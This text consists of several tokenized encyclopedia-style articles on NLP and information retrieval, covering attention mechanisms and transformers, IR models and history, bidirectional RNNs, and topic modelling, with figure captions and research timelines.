Samuel Lynn - Evans has shared his implementation with explanations .
The Annotated Transformer is another useful resource to learn the concepts along with the code .
A sequence - to - sequence model for machine translation .
Source : Weng 2018 .
Sutskever et al .
Google applies a sequence - to - sequence model to the task of machine translation , that is , a sequence of words in the source language is translated to a sequence of words in the target language .
They use an encoder - decoder architecture that has separate 4-layered LSTMs for encoder and decoder .
The encoder produces a fixed - length context vector , which is used to initialize the decoder .
The main limitation is that the context vector is unable to adequately represent long sentences .
Encoder - decoder architecture with attention .
Source : Weng 2018 , fig .
4 .
Bahdanau et al .
apply the concept of attention to the seq2seq model used in machine translation .
This helps the decoder to " pay attention " to important parts of the source sentence .
The encoder is a bidirectional RNN .
Unlike the seq2seq model of Sutskever et al .
, which uses only the encoder 's last hidden state , attention mechanism uses all hidden states of the encoder and decoder to generate the context vector .
It also aligns the input and output sequences , with alignment score parameterized by a feed - forward network .
Encoder self - attention distribution for the word ' it ' in different contexts .
Source : Uszkoreit 2017 .
Vaswani et al .
propose a transformer model in which they use a seq2seq model without RNN .
The transformer model relies only on self - attention , although they 're not the first to use self - attention .
Self - attention is about attending to different tokens of the sequence .
Variations of self - attention in decoder - only transformer .
Source : Liu et al .
2018 , fig .
1 .
For multi - document summarization , Liu et al .
propose a decoder - only transformer architecture that can attend to sequences longer than what encoder - decoder architecture is capable of .
Input and output sequences are combined into a single sequence and used to train the decoder .
During inference , output is generated auto - regressively .
They also propose variations of attention to handle longer sequences .
GPT 's transformer ( left ) and fine - tuning tasks ( right ) .
Source : Radford et al .
2018 , fig .
1 .
OpenAI publishes Generative Pre - trained Transformer ( GPT ) .
It 's inspired by unsupervised pre - training and transformer architecture .
The transformer is trained on large amounts of data without supervision .
It 's then fine - tuned on smaller task - specific datasets with supervision .
Pre - training involves a standard language model and uses Liu et al .
It 's a decoder - only transformer .
In February 2019 , OpenAI announced an improved model named GPT-2 .
Compared to GPT , GPT-2 is trained on 10x the data and has 10x parameters .
Google open sources Bidirectional Encoder Representations from Transformers ( BERT ) , which is a pre - trained language model .
It 's deeply bidirectional and unsupervised .
It improves the state - of - the - art in many NLP tasks .
It 's trained on two tasks : ( a ) Masked Language Model ( MLM ) , predicting some words that are masked in a sequence ; ( b ) Next Sentence Prediction ( NSP ) , a binary classification that predicts if the next sentence follows the current sentence .
Architecture of MT - DNN .
Source : Liu et al .
2019 , fig .
1 .
Combining Multi - Task Learning ( MTL ) and a pretrained language model , Liu et al .
propose Multi - Task Deep Neural Network ( MT - DNN ) .
The lower layers of the architecture are shared across tasks and use BERT .
Higher layers do task - specific training .
They show that this approach outperforms BERT in many tasks even without fine - tuning .
Transformer versus Evolved Transformer .
Source : So et al .
2019 , fig .
3 .
Just as AutoML has been used in computer vision , Google researchers use an evolution - based neural architecture search ( NAS ) to discover what they call an Evolved Transformer ( ET ) .
It performs better than the original transformer of Vaswani et al .
It 's seen that ET is a hybrid , combining the best of self - attention and wide convolution .
Context vectors ( right ) carry attention information from encoder to decoder .
Source : Su 2018 , fig .
15 .
In machine translation , the encoder - decoder architecture is common .
The encoder reads a sequence of words and represents it with a high - dimensional real - valued vector .
This vector , often called the context vector , is given to the decoder , which then generates another sequence of words in the target language .
If the input sequence is very long , a single vector from the encoder does n't give enough information for the decoder .
Attention is about giving more contextual information to the decoder .
At every decoding step , the decoder is informed how much " attention " it should give to each input word .
While attention started this way in sequence - to - sequence modelling , it was later applied to words within the same sequence , giving rise to self - attention and transformer architecture .
Since the late 2010s , attention mechanisms have become popular , sometimes replacing CNNs , RNNs and LSTMs .
Could you explain attention with an example ?
A Heatmap shows attention between source and target languages .
Source : Bahdanau et al .
2016 , fig .
3 .
Consider an example of machine translation .
The sentence " The agreement on the European Economic Area was signed in August 1992 " is to be translated to French , which might be " L'accord sur la zone économique européenne a été signé en août 1992 " .
We can see that " Economic " becomes " économique " and " European " becomes " européenne " , but their positions are swapped .
The phrase " was signed " becomes " a été signé " .
Thus , translation depends not just on individual words but also their context within the sentence .
Attention is meant to capture this context .
In this example , attention is passed from the encoder to the decoder .
The decoder generates the translated words one by one .
Each output word is influenced by all input words in different amounts .
Attention captures these weights .
We can also visualize attention via heatmaps .
In the figure , we map English words to translated French words .
We note that sometimes a translated word is attended to by multiple English words .
Lighter colours represent higher attention .
Could you describe the architecture of attention ?
Attention is calculated from the hidden states of the encoder and recent hidden state of the decoder .
Source : Karim 2019 .
Let 's consider machine translation as explained by Bahdanau et al .
( 2014 ) .
The encoder is a bidirectional RNN while the decoder is an RNN .
The input sequence is fed into the encoder whose hidden states are exposed to the decoder via the attention layer .
More specifically , the backward and forward hidden encoder states are concatenated .
These states are weighted to give a context vector that 's used by the decoder .
Attention weights are calculated by aligning the decoder 's latest hidden state with the encoder 's hidden status .
The decoder 's current hidden state is a function of its previous hidden state , previous output word and the context vector .
Attention is passed via the context vector , which itself is based on the alignment of encoder and decoder states .
Luong et al .
proposed a slightly different architecture .
Their encoder and decoder are each a 2-layer LSTM .
It also uses a feedforward network for the final output .
In Google 's Neural Machine Translation , 8-layer LSTM is used in encoders and decoders .
The first encoder layer is bidirectional .
Both encoder and decoder include some residual connections .
What do you mean by " alignment " in the context of attention mechanism ?
Illustrating different alignment score functions .
Source : Karim 2019 .
Bahdanau et al .
align the decoder 's sequence with the encoder 's sequence .
An alignment score quantifies how well the output at position i is aligned to the input at position j. The context vector that goes to the decoder is based on the weighted sum of the encoder 's RNN hidden states \(h_j\ ) .
These weights come from the alignment .
Mathematically , given an alignment model a , alignment energy e , context vector c , and weights α , we have : $ $ e_{ij } = a(s_{i-1},h_j)\\\alpha_{ij } = exp(e_{ij})/\sum_{k=1}^{T_x}{exp(e_{ik})}\\c_i = \sum_{j=1}^{T_x}{\alpha_{ij}h_j}$$ The decoder 's hidden state is based on its previous hidden state \(s_{i-1}\ ) , the previous predicted word and the current context vector .
At each time step , the context vector is adjusted via the alignment model and attention .
Thus , step by step , the decoder selectively attends to the input sequence via the encoder 's hidden states .
Bahdanau et al .
concatenated the forward and backward encoder hidden states and added these with decoder hidden state .
Luong et al .
proposed many other alternative alignment scores .
Vaswani et al .
proposed the scaled dot product .
What is self - attention ?
Self - attention applied to sentiment analysis .
Source : Cheng et al .
2016 , fig .
5 .
Self - attention is about attending to words within the sequence , such as within the encoder or decoder .
By seeing how one word attends to other words in the sequence , we 're able to capture syntactical structures .
Consider the sentence " The animal did n't cross the street because it was too tired " .
The word " it " refers to the animal .
What happens if we replace " tired " with " wide " ?
The word " it " now refers to the street .
Attention understands this .
In the former case , there 's high attention linking " it " and " animal " , but in the latter case , high attention shifts to " street " .
Self - attention was earlier applied together with RNNs .
Later , self - attention came to stand on its own .
Vaswani et al .
The paper titled Attention is all you need to show how we can get rid of CNNs and RNNs .
RNNs , in particular , are hard to parallelize on GPUs , which is a problem solved by self - attention .
Could you describe some applications of attention mechanism ?
Attention to heatmaps of clinical events in ICUs .
Source : Kaji et al .
2019 , fig .
3 .
Beyond its early application to machine translation , the attention mechanism has been applied to other NLP tasks such as sentiment analysis , POS tagging , document classification , text classification , and relation classification .
One research used human eye - tracking corpora to derive attention and enhance NLP tasks .
In another study , semantic role labelling was improved using linguistically - informed self - attention .
By combining CNN with self - attention , the Google Brain team achieved top results for image classification and object detection .
In Visual Question Answering ( VQA ) , where there 's a need to focus on small areas or details of the image , the attention mechanism is useful .
Attention is also useful for image captioning .
In speech recognition , attention aligns characters and audio .
In one medical study , higher attention was given to abnormal heartbeats from ECG readings to more accurately detect specific heart conditions .
In another study based on ICU data , feature - level attention was used rather than attention to embeddings .
This provided physicians with better interpretability .
What 's the difference between global and local attention ?
Local attention using a Gaussian function .
Source : Ramamoorthy 2018 .
The distinction between global versus local attention originated in Luong et al .
( 2015 ) .
In the task of neural machine translation , global attention implies we attend to all the input words , and local attention means we attend to only a subset of words .
It 's said that local attention is a combination of hard and soft attentions .
Like hard attention , it focuses on a subset .
Like soft attention , it 's differentiable and hence easier to implement and train .
It 's computationally simpler than global or soft attention .
Given the decoder 's current state , local attention first selects the best aligned position \(p_t\ ) in the input sequence .
Note that selecting \(p_t\ ) is not directly influenced by the encoder 's status .
Local attention is also called window - based attention because it 's about selecting a window of input tokens for attention distribution .
This window is centred on \(p_t\ ) .
To keep the approach differentiable , a Gaussian distribution is applied on the window .
Attention \(a_t\ ) is therefore focused around \(p_t\ ) .
Even before attention mechanism became popular via NLP in later years , it was used in computer vision .
Mnih et al .
propose a method to focus on important parts of an image that are then processed at high resolution .
Instead of processing the entire image at once , it 's processed sequentially , attending to different locations as are relevant to the task .
Encoder - decoder architecture with attention .
Source : Weng 2018 , fig .
4 .
Bahdanau et al .
apply the concept of attention to the seq2seq model used in machine translation .
This helps the decoder to " pay attention " to important parts of the source sentence .
The encoder is a bidirectional RNN .
Unlike earlier seq2seq models that use only the encoder 's last hidden state , the attention mechanism uses all hidden states of the encoder and decoder to generate the context vector .
It also aligns the input and output sequences , with alignment score parameterized by a feed - forward network .
Soft attention versus hard attention in computer vision .
Source : Xu et al .
2016 , fig .
2 .
Xu et al .
propose the use of visual attention to the task of image captioning .
They distinguish between soft attention and hard attention .
Soft deterministic attention is smooth and differentiable , and is trained by standard back propagation .
Hard stochastic attention is trained by maximizing an approximate variational lower bound .
Soft attention is similar to Bahdanau et al .
's proposal .
( a ) Single layer model .
( b ) Multi - hop attention model .
Source : Sukhbaatar et al .
2015 , fig .
1 .
Sukhbaatar et al .
propose the concept of multi - hop attention .
Each hop or layer contains attention weights .
Input and output from each layer is fed to the next higher layer .
Thus , no hard decisions are taken in each layer .
Outputs from each layer are passed on in a " soft " manner until prediction after the last layer .
Comparing global attention versus local attention .
Source : Luong et al .
2015 , fig .
2 , 3 .
Luong et al .
distinguish between global attention and local attention .
In global attention , we attend to all the input words .
In local attention , we attend to only a subset of words .
Attention - based VQA outperforms traditional VQA .
Source : Chen et al .
2016 , fig .
1 .
An attention mechanism has been applied to computer vision .
For Visual Question Answering ( VQA ) , Chet et al .
propose Attention - Based Configurable Convolutional Neural Network ( ABC - CNN ) .
The query text guides the model to pay attention to relevant image regions .
In traditional VQA models , visual processing and question understanding are done separately .
Visualizing attention at word level and sentence level .
Source : Yang et al .
2016 , fig .
6 .
Yang et al .
propose the Hierarchical Attention Network ( HAN ) .
This comes from their insight that documents have a hierarchical structure ( words , sentences , documents ) .
HAN has two levels of attention : word level and sentence level .
This enables the model to more accurately do document classification .
It improves on the state - of - the - art when tested on Yelp , IMDb and Amazon datasets .
Kränkel and Lee provide a good description of HAN .
Embed , encode , attend , and predict .
Source : Honnibal 2016 .
Matthew Honnibal describes what he calls the new neural network playbook for NLP .
It 's a four - step approach : embed , encode , attend , predict .
This highlights the importance and usefulness of attention mechanism .
Word embeddings do the embed part at word level .
Bidirectional RNNs do the encode part at sequence level .
Using a context vector , each part produces a vector that 's given to a feed - forward network .
The predict part is done by this network .
Shallow or deep inter - attention and intra - attention fusion .
Source : Cheng et al .
2016 , fig .
3 .
For the task of machine reading , Cheng et al .
propose the use of both inter - attention ( between encoder and decoder ) and intra - attention ( within encoder or decoder ) .
Intra - attention ( later to be called self - attention ) is about attending to tokens within a sequence , thus uncovering lexical relations between tokens .
Encoder self - attention distribution for the word ' it ' in different contexts .
Source : Uszkoreit 2017 .
Vaswani et al .
propose a transformer model in which they use a seq2seq model without RNN .
The transformer model relies only on self - attention .
Self - attention is about attending to different tokens of the sequence .
Self - attention leads to powerful language models including BERT ( 2018 ) and GPT-2 ( 2019 ) .
Attention mechanism ( left ) and multi - head attention ( right ) .
Source : Veličković et al .
2018 , fig .
1 .
Veličković et al .
apply attention to nodes in a graph .
Nodes attend to neighbours .
The computations can be parallelized .
Architecture of an ad hoc IR system .
Source : Jurafsky and Martin 2009 , sec .
23.2 .
Information Retrieval ( IR ) refers to finding out relevant information from any kind of data .
It may be audio , video , document , article or an image .
Traditional ways of information retrieval consist of breaking down data into subsets or clusters across dimensions and finding relevant information according to problem statement .
There are various ways to retrieve information from any unstructured data .
It started with rule - based models .
More recently , neural networks are being used .
The way humans understand is far more complex than how machines understand .
Machines follow the logic of finding out similarities , differences or links with the input data .
But it 's hard to interpret many too many relationships .
Humans are able to do this with all previous information stored in memory whenever an image , text or video appears .
What 's the difference between Information Retrieval ( IR ) and Information Extraction ( IE ) ?
IR is about searching and retrieving unstructured documents that fulfil a specific search query .
IE is about obtaining structured representation of key information from unstructured documents .
For example , IR can help us find all the documents about fishing whereas IE can tell who went fishing and what type of fish was caught .
Information retrieval is the process of gathering information or sources that are appropriate to the topic from a collection of raw text data .
Information extraction is a kind of automated process where a rule - based algorithm is applied to structured data after it is obtained from any unstructured source .
It involves NLP techniques of cleaning and arranging it in a matrix .
It also involves activities like automatic annotation or content extraction .
Could you mention some applications IR ?
Web search is an example of IR .
A search engine might search billions of web documents to respond to a query such as " Italian restaurants near me " or " flights to London tomorrow " .
A more personal example is to search through emails .
IR in this case , is typically executed by a mail program such as GMail .
Searching through online discussion forums or Q&A archives is another IR application .
Text classification is typically used to classify posts , questions and answers .
In any enterprise system , we might need to retrieve patent documents , research papers or other publications based on a keyword or phrase .
In a library , we might want to obtain books with specific words in their titles , or by author name , or by genre .
On an e - commerce site , we might want to apply various criteria and see a filtered list of products .
As an example of IR for multimedia , MPEG-7 is a standard that 's used to describe multimedia content .
This metadata can be searched to retrieve audio / video clips that are of interest to the user .
What are some essential terms used in information retrieval ?
A systematic approach to information retrieval .
Source : Lalmas et al .
2001 , fig .
2 .
While the term " record " is common in databases , the equivalent term in IR is document .
It refers to a basic unit of data stored in the system .
A document can be a newspaper article , an encyclopaedia entry , a paragraph in a report , a web page , an entire website , etc .
It really depends on the application .
A set of documents indexed and stored is called a collection .
Alternative names include archive , corpus , and digital library .
A query is what the user submits to the system to meet her information needs .
A query is composed of one or more terms .
A term is a lexical item but it could be a phrase as well .
Searching through each document is a slow , inefficient process .
Instead , each document is indexed in advance .
The index is a structured representation of the document .
Searching through this representation is much faster .
A similar representation of the query aids the retrieval function .
In practice , IR systems use an inverted index that maps each index term to a list of documents in which it occurs .
Does information retrieval search through structured or unstructured documents ?
Information retrieval typically concerns itself with unstructured documents .
IR started with a focus on text .
More recently , due to machine learning and improved processing capability , other types such as images , audio , and video can also be retrieved .
While documents may be unstructured , often they are accompanied by structured metadata .
Metadata is data about the document .
For example , an email will have fields date , from , to , subject , and body .
This is useful structured information .
Another example is a photograph taken with a digital camera .
Useful metadata might include date , camera model , exposure setting , and picture dimensions .
Sometimes documents are semi - structured in the sense that specific information is in " standard " locations that heuristic algorithms can identify .
Text documents with sections and sub - sections are also semi - structured .
XML documents can be seen as semi - structured that IR systems can exploit .
What are the various models of IR ?
Taxonomy of Classic IR Models .
Source : Chen 2008 , slide 2 .
IR models can be categorized into Classic , Structured and Browsing models .
Classic models include Boolean , Vector Space and Probabilistic models .
Boolean primitives ( AND , OR , NOT ) can be used in queries according to user 's information .
This requires some skills for any complex IR .
Different vocabulary will result in problems with string matching .
This is the most used approach .
Vector space models use vectors to map documents , phrases or terms .
Words / terms can be categorized into high or low resolving power weights according to the vector dimension of the document .
This helps in finding out positive / negative or similar / opposite matches and retrieving information .
Probability distribution models use different distribution types to find out similarity between documents .
It can be one of two types : similarity - based and expected - utility - based .
TF - IDF and HMM can be used in different frameworks to generate multiple words within the same model , making comparison easier .
HMM gives better accuracy than traditional TF - IDF models .
Two broad matching strategies are : Literal Term : Vector Space Model ( VSM ) , Hidden Markov Model ( HMM ) , Language Model ( LM ) Concept : Latent Semantic Analysis ( LSA ) , Probabilistic Latent Semantic Analysis ( PLSA ) , Topical Mixture Model ( TMM ) How is information retrieval represented ?
Document representation in vector space model .
Source : Baazeem 2015 , fig .
4 .
Information is any unstructured form of data which consists of insights of any particular domain .
It needs to be converted to a format that can then be parsed / extracted into structured form .
Information in text format can be represented as document representation or query representation .
The content of a document can be represented as a collection of terms such as terms , phrases or other units .
Every term will have its weight which gives its importance to that document .
A proper term weighting is needed according to various aspects of words , phrases , names , statistical , linguistic and other means for better IR .
Query representation is based on the conventional approach to formulating a query based on a keyword or set of keywords .
But in several cases , there 's no relevant context for users to select appropriate keywords .
In that case , maximal frequent sequences are used to retrieve relevant documents from an input document .
A bag - of - words model is used to identify keywords and extract similar documents .
Which are some basic techniques used in information retrieval ?
Let 's say a query has the term ' processed ' .
A strict match for this word will leave out documents that contain variants such as ' processing ' and ' process ' .
Stemming or lemmatization solve this , but they create their own problems .
Often it does n't make sense to index words such as ' to ' , ' be ' , ' for ' , etc .
A stop list of these high - frequency words is often omitted for indexing .
Suppose the user searches for ' high blood pressure ' .
The IR system may also search for ' hypertension ' and ' hypertension , renal ' .
This is called query expansion .
Query expansion usually involves pre - generating a suitable thesaurus using term clustering .
When a query has multiple terms , some terms may be more important than others .
This is done by term weighting .
TF - IDF is a popular approach .
To improve IR performance , relevance feedback can be used , typically in VSM .
The user is shown a small set of retrieved documents to get feedback on what 's relevant and what 's not .
The IR system then refines the query to improve performance .
What are some useful resources on Information Retrieval ?
Some collections for IR research .
Source : Melucci 2015 , slide 47 .
Greengrass ( 2000 ) offers a comprehensive survey of IR .
Nyamisa et al .
( 2017 ) is another survey paper .
Zhou et al .
( 2006 ) introduces basic terms and concepts .
There 's also a comprehensive online IR glossary .
Stanford University 's CS276 course on IR is worth studying .
Among the books for IR , you can look into Manning et al .
( 2009 ) , Croft et al .
( 2015 ) and Frakes et al .
( 1992 ) .
For IR research , you 'll need collections .
Wiki Small / Large and CACM collections are available for free download .
TIPSTER Complete is another useful collection .
Other important collections include the Cranfield collection , TREC , GOV2 , Reuters-21578 , Reuters - RCV1 , and 20 newgroups .
For cross - language IR , there 's NTCIR and CLEF .
To keep track of the latest developments , ACM 's Special Interest Group on Information Retrieval ( SIGIR ) is the place to visit .
A search plate containing ' GE MN ' looks for documents that match this metadata .
Source : Goldberg 1931 .
Emanuel Goldberg received a US patent for a machine that does information retrieval .
The machine is opto - electric in nature .
Light is passed through a negative search plate containing the search terms .
Document matches are picked up by activating a photoelectric cell .
All matches are recorded on a photographic plate .
Calvin Mooers coins the term Information Retrieval .
Punched holes on search card must match with those of record cards .
Source : Luhn 1952 , pp .
7 .
H. P. Luhn describes an early IR system from IBM .
It makes use of punched cards and a photoelectric scanning unit .
Information is indexed and encoded into record cards .
A query is input as a search card .
Plug connections on a switchboard control how search terms are combined .
This is therefore one of the earliest implementations of the Boolean Model for IR .
A dictionary of notions to aid information retrieval .
Source : Luhn 1957 , fig .
2 .
H. P. Luhn proposes a statistical approach to IR .
Content can be identified based on the frequency of occurrence of words .
This also means that documents can be indexed automatically based on the words they contain .
This is , therefore , the first attempt at automatic indexing .
The system uses statistical information to group words into " notional " families .
Cavin Mooers notes that often using information is not rewarded .
Those who are at work are seen as getting the job done rather than fussing about information .
Having information means you have to read it , understand it , store it carefully and make decisions based on it .
These observations lead Mooers to define Mooers ' Law . An information retrieval system will tend not to be used whenever it is more painful and troublesome for a customer to have information than for him not to have it .
Maron and Kuhns published a paper titled On Relevance , Probabilistic Indexing and Information Retrieval .
Where previous IR systems returned matching documents , the idea in this paper is to rank documents by computing probability of relevance .
The paper also introduces the notion of query expansion .
In years to come , this will go on to become one of the most influential papers in the field of IR .
Salton and Lesk propose the SMART retrieval system .
It goes beyond Luhn 's work of 1957 .
It uses the original search words along with their word stems .
It uses synonym dictionaries to account for variations in vocabulary .
It uses relations between words and surrounding words to determine the nature of content .
Over the years , the SMART system has developed or uses many important concepts such as vector model , term weighting , relevance feedback , and cosine similarity measure .
Robertson and Jones implement a probabilistic model for IR .
From the distribution of index terms in documents , they determine term weights .
This work is perhaps the first real application of the probability to IR as proposed by Maron and Kuhns in 1960 .
Illustrating the traditional Boolean model .
Source : Khilfeh 2014 , fig .
1 .
Salton et al .
propose the extended Boolean model .
Output from a traditional Boolean model is hard to control and retrieved documents are not ranked .
The extended model assigns weights to terms in both queries and documents .
This enables the model to rank retrieved documents based on similarity to queries .
Dumais et al .
note two common problems in IR : the same word has many meanings , different words express the same concept .
These result in irrelevant documents or missed relevant documents respectively .
They therefore propose a novel method that maps terms and documents into a lower dimensional semantic space .
In later years , this field was named Latent Semantic Analysis ( LSA ) .
In the US , the Text Retrieval Conference ( TREC ) has been launched to facilitate research and collaboration in IR .
It went on to become an almost annual event .
The growth of the web and the need for large - scale IR makes TREC all the more relevant .
TREC produces test collections that are useful for IR research .
At SIGIR'98 , Ponte and Croft proposed the use of Language Modelling ( LM ) for the task of IR .
They note that typical IR systems lack a good indexing model .
Existing indexing models make unwarranted parametric assumptions .
They therefore propose a single non - parametric model for both indexing and retrieval .
They show better performance compared to TF - IDF weighting .
In 2001 , Zhai and Lafferty studied different smoothing techniques for such language models .
Google was founded for web search .
By now , many other search engines are already popular : Lycos ( 1994 ) , Yahoo !
Search ( 1995 ) , Excite ( 1995 ) , AltaVista ( 1995 ) , Yandex ( 1997 ) .
These engines have become the best instantiations of IR .
They use features that until now were only experimental .
Two NN architectures to score query - document relevance : ( A ) Two mirror models with shared weights ; ( B ) Joint model .
Source : Zhang et al .
2017 , fig .
4 .
There 's growing interest in applying neural networks to IR .
This is called Neural IR .
The network learns representations of queries and documents .
In one application of Neural IR from 2019 , two deep models are trained , one for image and one for text .
This allows a user to retrieve images based on a textual query , or vice versa .
However , early work on content - based image retrieval can be traced to the work of Wan et al .
( 2014 ) .
Many applications are sequential in nature .
One input follows another in time .
Dependencies among these give us important clues as to how they should be processed .
Since Recurrent Neural Networks ( RNNs ) model the flow of time , they 're suited for these applications .
RNN has the limitation that it processes inputs in a strict temporal order .
This means the current input has the context of previous inputs but not the future .
Bidirectional RNN ( BRNN ) duplicates the RNN processing chain so that inputs are processed in both forward and reverse time order .
This allows a BRNN to look at future context as well .
Two common variants of RNN include GRU and LSTM .
LSTM does better than RNN in capturing long - term dependencies .
Bidirectional LSTM ( BiLSTM ) in particular , is a popular choice in NLP .
These variants are also within the scope of this article .
Could you explain Bidirectional RNN with an example ?
Bidirectional RNN has forward and backward RNNs .
Source : MLWhiz 2018 .
Consider the phrase , ' He said , " Teddy _ " .
From these three opening words , it 's difficult to conclude if the sentence is about Teddy Bears or Teddy Roosevelt .
This is because the context that clarifies Teddy comes later .
RNNs ( including GRUs and LSTMs ) are able to obtain the context only in one direction , from the preceding words .
They 're unable to look ahead to future words .
Bidirectional RNNs solve this problem by processing the sequence in both directions .
Typically , two separate RNNs are used : one for forward direction and one for reverse direction .
This results in a hidden state from each RNN , which is usually concatenated to form a single hidden state .
The final hidden state goes to a decoder , such as a fully connected network followed by softmax .
Depending on the design of the neural network , the output from a BRNN can either be the complete sequence of hidden states or the state of the last time step .
If a single hidden state is given to the decoder , it comes from the last states of each RNN .
What are some applications of Bidirectional RNN ?
Use of BiLSTM and CRF for NER .
Source : Lample et al .
2016 , fig .
1 .
BiLSTM has become a popular architecture for many NLP tasks .
An early application of BiLSTM was in the area of speech recognition .
Other applications include sentence classification , sentiment analysis , review generation , or even medical event detection in electronic health records .
BiLSTM has been used for POS tagging and Word Sense Disambiguation ( WSD ) .
For Named Entity Recognition ( NER ) , Lample et al .
used word representations that captured both character - level characteristics and word - level context .
These were fed into a BiLSTM encoder layer .
The sequence of hidden states was decoded by a CRF layer .
For lemmatization , one study used two - layer bidirectional GRUs for the encoder .
The decoder was a conditional GRU plus another GRU layer .
Another study used a two - layer BiLSTM encoder and a one - layer LSTM decoder .
A stack of four BiLSTMs has been used for Semantic Role Labelling ( SRL ) .
In general , the paradigm of embed - encode - attend - predict has become popular in NLP work .
The encode part benefits from BiLSTM , which has been shown to capture position - sensitive features .
Beyond NLP , BiLSTM has been applied to image processing applications such as OCR .
What are merging modes in Bidirectional RNN ?
Log loss vs number of time steps for some merging modes .
Source : Brownlee 2017 .
Merge mode is about how forward and backward hidden states should be combined before being passed on to the next layer .
In the Keras package , supported modes are summation , multiplication , concatenation and averaging .
The default mode is concatenation and this is what most research papers use .
In MathWorks , as of December 2019 , only concatenation was supported .
What are some limitations of Bidirectional RNN ?
One limitation to BRNN is that the entire sequence must be available before we can make predictions .
For some applications , such as real - time speech recognition , the entire utterance may not be available and BRNN may not be adequate .
In the case of language models , the task is to predict the next word given preceding words .
BRNN is clearly not suitable since it expects future words as well .
Applying BRNN in this application will give poor accuracy .
Moreover , BRNN is slower than RNN since the results of the forward pass must be available for the backward pass to proceed .
Gradients will therefore have a long dependency chain .
LSTMs capture long - term dependencies better than RNN and also solve the exploding / vanishing gradient problem .
However , stacking many layers of BiLSTM creates the vanishing gradient problem .
Deep neural networks so successful with CNNs are not so successful with BiLSTMs .
BRNN unfolded in time for three time steps .
Source : Schuster and Paliwal 1997 , fig .
3 .
Schuster and Paliwal propose the Bidirectional Recurrent Neural Network ( BRNN ) as an extension of the standard RNN .
Since the forward and backward RNNs do n't interact , they can be trained similar to the standard RNN .
In regression and classification experiments , they observed better results with BRNN .
BiLSTM recognizes the phonemes better than either forward or backward LSTM alone .
Source : Graves and Schmidhuber 2005 , fig .
1 .
For phoneme classification in speech recognition , Graves and Schmidhuber use Bidirectional LSTM and obtain good results .
It 's based on the insight that humans often understand sounds and words only after hearing the future context .
In particular , often we do n't require an output immediately upon receiving an input .
We can afford to wait for a sequence of inputs and then work on the output .
They also show that BRNN takes eight times longer to converge than BiLSTM .
Google uses BiLSTM for Neural Machine Translation .
Source : Wu et al .
2016 , fig .
1 .
Google replaced its phrase - based translation system with Neural Machine Translation ( NMT ) .
It uses a deep LSTM network with 8 encoders and 8 decoder layers .
The first layer of the encoder is BiLSTM while all others are LSTM .
Pre - trained LM used to initialize hidden states between two bidirectional GRUs .
Source : Peters et al .
2017 , fig .
2 .
Pre - trained word embeddings are commonly used in neural networks for NLP .
However , they do n't capture context .
Supervised learning for capturing context uses limited labelled data .
To overcome this limitation , Peters et al .
use BiLSTM to learn a language model ( LM ) and initialize a neural network for sequence tagging .
This network uses two - layer bidirectional GRUs .
They experiment with NER and chunking .
They find the best result when LM embeddings are used at the output of the first layer .
Illustrating the use of two BiLSTMs for Semantic Role Labelling .
Source : He et al .
2017 , fig .
1 .
For the task of Semantic Role Labelling ( SRL ) , He et al .
use an eight - layer network consisting of four BiLSTMs .
Their network includes highway connections and transform gates that control inter - layer information flow .
Output prediction is done by a softmax layer .
Comparing the architectures of Deep Stacked BiLSTM vs. Densely Connected BiLSTM .
Source : Ding et al .
2018 , fig .
2 .
When BRNNs are stacked , they suffer from vanishing gradients and overfitting .
Ding et al .
propose a Densely Connected BiLSTM ( DC - BiLSTM ) as a solution .
This essentially means that a layer 's hidden state includes the hidden states of all preceding layers .
They show that the proposed architecture can handle up to 20 layers while improving performance over BiLSTM .
Peters et al .
publish details of a language model called Embeddings from Language Models ( ELMo ) .
ELMo representations are deep , that is , they 're a linear combination of the states of all LSTM layers rather than using only the top layer representation .
They show that higher layers capture context - dependent semantics whereas lower layers capture syntax .
While their model uses both forward and backward LSTMs , the forward LSTM stack is independent of the backward LSTM stack .
Representations of each layer of the two stacks are concatenated .
For this reason , they use the term Bidirectional Language Model ( BiLM ) .
One or more topics attached to emails .
Source : Zhao 2019 , 1:00 .
The growth of the web since the early 1990s has resulted in an explosion of online data .
In an effort to organize all this unstructured data , topic models were invented as a text mining tool .
Topic modelling uncovers underlying themes or topics in documents .
Consider a document in which the words ' dog ' and ' bone ' occur often .
We can say that this document belongs to the topic of Dogs .
Another document with the words ' cat ' and ' meow ' occurring frequently is the topic Cats .
In another example , based on words in the content , emails can be topically labelled as Personal , Project or Financial .
An email can also belong to multiple topics .
Topic modelling can be seen as a form of tagging .
Topic modelling is an unsupervised task .
LDA and its many variants have been popular .
LDA is a probabilistic generative model .
What are some typical applications of topic modelling ?
Manually defined scientific fields of study ( y - axis ) are correlated with uncovered topics ( x - axis ) .
Source : Griffiths and Steyvers 2004 , fig .
4 .
The early invention and application of topic models was in the field of text mining and information retrieval .
Since then , topic modelling has been used in various applications , including classification , categorization , summarization , and segmentation of documents .
More unique applications include computer vision , population genetics and social networks .
In information retrieval , topic modelling helps in query expansion .
It also personalizes search results or makes recommendations by mapping user preferences to topics .
When analyzing scientific literature , it 's been noted that topics often correspond with scientific disciplines .
We can also track how topics evolve over time .
For example , the topic ' string ' in Physics ( for string theory ) has been more common since the 1970s .
In social sciences , topic modelling enables qualitative analysis .
Sentiment analysis and social network analysis are two examples .
In software engineering , topic modelling has been used to analyze source code , change logs , bug databases , and execution traces .
In bioinformatics , compared to traditional data reduction techniques , topic modelling is seen to be more promising since it 's more easily interpretable .
How is topic modelling different from text classification or clustering ?
Topic modelling vs document clustering .
Source : Krishan 2016 .
Text classification is a supervised task that learns a classifier from training data .
Topic modelling is an unsupervised task where topics are not learned in advance .
Topics are induced from the actual data .
Text clustering and topic modelling are similar in the sense that both are unsupervised tasks .
Both attempt to organize documents for better information retrieval and browsing .
However , there 's a difference .
Text clustering looks at the similarity among documents and attempts to form similar clusters of these documents .
These similarity measures could be based on TF - IDF weighting .
In topic modelling , we do n't look at document similarity .
Instead , we treat a document as a mixture of topics in which a topic is a probability distribution of words .
Soft clustering ( where a document can belong to multiple clusters ) can be viewed as being similar to topic modelling , though the approaches still differ .
Thus , the clusters from text clustering are not quite the same as topics in topic modelling .
They 're , however , seen as complementary .
Research from the mid-2000s explored combining both techniques into a single model .
What 's the typical pipeline for topic modelling ?
Topic Modelling identifies topics and their distributions .
Source : Joshi 2018 .
Topic models perform a statistical analysis of words presented in each document from a collection of documents .
The model is expected to output three things : ( a ) clusters of co - occurring words , each of which represents a topic ; ( b ) the distribution of topics for each document ; ( c ) a histogram of words for each topic .
To build a model , we must balance different aspects : fidelity ( how well the model reflects the real world ) , performance , tractability ( discrete models are preferred ) , and interpretability .
In the bag - of - words model , the ordering of words in each document is ignored .
